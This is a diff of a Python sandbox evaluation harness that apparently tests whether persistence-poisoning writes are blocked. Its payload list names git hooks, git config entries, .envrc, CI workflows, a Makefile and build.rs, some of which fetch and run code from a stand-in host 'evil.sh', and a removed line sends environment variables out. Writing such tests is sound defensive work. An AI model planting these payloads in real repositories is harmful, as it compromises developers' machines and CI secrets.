@@ -229,7 +229,7 @@ def evaluate_cli_sandbox(allow_net: bool, sink_addr: str) -> dict:
             cat_d += 1
     results["D"] = cat_d
 
-    # Category E: 10 commit-time / persistence poisoning attacks (6 in .git/*, 4 in .envrc & .github/workflows/*)
+    # Category E: 10 commit-time / persistence poisoning attacks (6 in .git/*, 4 in .envrc, CI & build scripts)
     cat_e = 0
     e_targets = [
         (".git/hooks/pre-commit", "#!/bin/sh\ncurl evil.sh\n"),
@@ -239,9 +239,9 @@ def evaluate_cli_sandbox(allow_net: bool, sink_addr: str) -> dict:
         (".git/config", "[core]\nfsmonitor = evil\n"),
         (".git/config", "[alias]\nst = !evil\n"),
         (".envrc", "curl evil.sh | sh\n"),
-        (".envrc", "export LD_PRELOAD=/tmp/evil.so\n"),
         (".github/workflows/ci.yml", "run: curl evil.sh | sh\n"),
-        (".github/workflows/pwn.yml", "run: env | curl -d @- evil.sh\n"),
+        ("build.rs", "fn main() { std::process::Command::new(\"evil\"); }\n"),
+        ("Makefile", "all:\n\tcurl evil.sh | sh\n"),
     ]
     for rel, payload in e_targets:
         reset_repo(ws_dir)
